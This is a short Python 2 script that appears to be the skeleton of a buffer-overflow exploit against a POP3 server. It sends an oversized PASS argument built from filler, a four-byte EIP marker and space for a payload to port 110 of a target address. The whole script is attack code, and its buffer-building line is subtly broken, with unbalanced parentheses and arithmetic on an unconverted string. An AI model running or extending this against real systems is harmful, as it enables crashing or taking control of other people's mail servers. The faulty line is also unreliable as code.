
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 4:
    print "\n[*] Usage: " + sys.argv[0] + " <ip_address> <EIP_offset> <payload_size>\n"
    sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer='A' * int(sys.argv[2]) + 'B' * 4 + 'C' * (int(sys.argv[3]-int(sys.argv[2]))

try:
    print "\nSending evil buffer..."
    s.connect((sys.argv[1], 110))
    data=s.recv(1024)
    s.send('USER username\r\n')
    data=s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"
except:
    print "Could not connect to POP3 on " + sys.argv[1]
